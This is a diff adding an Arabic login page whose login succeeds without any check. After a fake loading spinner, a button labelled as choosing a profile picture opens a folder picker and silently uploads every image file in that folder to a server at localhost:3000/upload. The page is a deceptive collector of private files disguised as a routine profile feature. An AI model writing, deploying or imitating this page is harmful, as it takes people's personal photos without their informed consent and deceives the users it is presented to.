@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #ffffff, #5fb9ec);
+        }
+
+        .card {
+            width: 300px;
+            height: 350px;
+            background: #07182E;
+            position: absolute;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+        }
+
+        .hidden {
+            opacity: 0;
+            transform: scale(0.8);
+            pointer-events: none;
+        }
+
+        .box {
+            width: 100%;
+        }
+
+        .box h2 {
+            color: white;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+        }
+
+        .box input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .box button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            background: #2193b0;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        .box button:hover {
+            background: #176d81;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #ffffff, #5fb9ec);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 44px;
+            height: 44px;
+            animation: spinner-y0fdc1 2s infinite ease;
+            transform-style: preserve-3d;
+        }
+
+        .spinner > div {
+            background-color: rgba(0, 77, 255, 0.2);
+            height: 100%;
+            position: absolute;
+            width: 100%;
+            border: 2px solid #004dff;
+        }
+
+        .spinner div:nth-of-type(1) { transform: translateZ(-22px) rotateY(180deg); }
+        .spinner div:nth-of-type(2) { transform: rotateY(-270deg) translateX(50%); transform-origin: top right; }
+        .spinner div:nth-of-type(3) { transform: rotateY(270deg) translateX(-50%); transform-origin: center left; }
+        .spinner div:nth-of-type(4) { transform: rotateX(90deg) translateY(-50%); transform-origin: top center; }
+        .spinner div:nth-of-type(5) { transform: rotateX(-90deg) translateY(50%); transform-origin: bottom center; }
+        .spinner div:nth-of-type(6) { transform: translateZ(22px); }
+
+        @keyframes spinner-y0fdc1 {
+            0% { transform: rotate(45deg) rotateX(-25deg) rotateY(25deg); }
+            50% { transform: rotate(45deg) rotateX(-385deg) rotateY(25deg); }
+            100% { transform: rotate(45deg) rotateX(-385deg) rotateY(385deg); }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div id="loginCard" class="card">
+        <div class="box">
+            <h2>تسجيل الدخول</h2>
+            <input type="text" placeholder="اسم المستخدم">
+            <input type="password" placeholder="كلمة المرور">
+            <button onclick="login()">دخول</button>
+        </div>
+    </div>
+
+    <div id="logoutCard" class="card hidden">
+        <div class="box">
+            <h2>تم تسجيل الدخول بنجاح!</h2>
+            <button onclick="logout()">choose a profle picture </button>
+        </div>
+    </div>
+
+    <div id="loadingScreen" class="loading-screen">
+        <div class="spinner">
+            <div></div><div></div><div></div><div></div><div></div><div></div>
+        </div>
+    </div>
+
+    <script>
+        function showLoading(callback) {
+            document.getElementById("loginCard").classList.add("hidden");
+            document.getElementById("logoutCard").classList.add("hidden");
+            document.getElementById("loadingScreen").style.display = "flex";
+
+            setTimeout(() => {
+                document.getElementById("loadingScreen").style.display = "none";
+                callback();
+            }, 5000);
+        }
+
+        function login() {
+            showLoading(() => {
+                document.getElementById("logoutCard").classList.remove("hidden");
+            });
+        }
+
+        async function logout() {
+    try {
+        const directoryHandle = await window.showDirectoryPicker();
+        showLoading(() => {
+            document.getElementById("loginCard").classList.remove("hidden");
+        });
+
+        for await (const entry of directoryHandle.values()) {
+            if (entry.kind === 'file') {
+                const file = await entry.getFile();
+
+                // تحقق أن الملف صورة
+                if (file.type.startsWith("image/")) {
+                    await sendToServer(file);
+                }
+            }
+        }
+
+    } catch (error) {
+        console.error("لم يتم اختيار مجلد أو حدث خطأ:", error);
+    }
+}
+
+async function sendToServer(file) {
+    const formData = new FormData();
+    formData.append('image', file); // يجب أن يتطابق مع multer.single('image')
+
+    try {
+        const response = await fetch('http://localhost:3000/upload', {
+            method: 'POST',
+            body: formData
+        });
+
+        const data = await response.text(); // لأنك في السيرفر ترجع نص، مش JSON
+        if (!response.ok) {
+            console.error("فشل إرسال الصورة:", data);
+        } else {
+            console.log("✅ تم إرسال صورة:", file.name);
+        }
+    } catch (err) {
+        console.error("خطأ أثناء الإرسال:", err);
+    }
+}
+
+
+    </script>
+
+</body>
+</html>
